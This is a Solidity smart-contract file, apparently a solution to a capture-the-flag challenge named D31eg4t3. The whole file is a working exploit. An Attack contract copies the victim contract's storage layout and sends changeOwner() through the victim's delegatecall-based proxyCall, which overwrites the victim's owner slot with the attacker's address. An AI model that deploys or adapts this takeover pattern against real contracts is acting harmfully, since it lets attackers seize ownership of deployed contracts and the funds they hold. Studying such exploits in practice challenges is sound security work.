// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
}

contract Attack {
    address internal immutable victim;
    uint256 var0 = 12345;
    uint8 var1 = 32;
    string private var2;
    address private var3;
    uint8 private var4;
    address public owner; // Mimic the owner in the D31eg4t3 contract's storage layout

    constructor(address addr) {
        victim = addr;
        owner = msg.sender; // Initial owner is the deployer; this will be changed
    }

    // Function to change the owner in the Attack contract
    // When called via delegatecall from D31eg4t3, it will change D31eg4t3's owner
    function changeOwner() public {
        owner = msg.sender; // This will point to the hacker when called correctly
    }

    function exploit() external {
        bytes memory data = abi.encodeWithSignature("changeOwner()");
        ID31eg4t3(victim).proxyCall(data);
    }
}